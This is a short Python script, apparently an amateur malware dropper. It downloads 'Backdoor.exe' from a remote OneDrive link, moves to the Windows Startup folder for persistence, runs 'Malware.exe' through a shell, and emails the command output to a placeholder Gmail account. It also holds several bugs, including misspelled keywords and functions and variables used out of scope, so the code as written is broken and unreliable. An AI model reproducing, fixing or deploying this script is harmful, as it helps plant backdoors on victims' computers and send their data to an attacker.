#!/usr/bin/env python
import requests, subprocess, smtplib, os, time

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") a outfile:
        outfile.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

def command_execution():
    os.chdir("C:\Windows\Start Menu\Programs\Startup")
    command1 = "cd C:\Windows\Start Menu\Programs\Startup"          #windows or linux commands here..!!
    command2 = "Malware.exe"
    data1 = subprocess.check_output(command1, shell=True)
    data2 = subprocess.check_ouput(command2, shell=True)

download("https://1drv.ms/u/Backdoor.exe")
send_mail(email="YourEmailAddress_Here", password="YourPass_Here",message=data1)
command_execution()
os.remove(file_name)
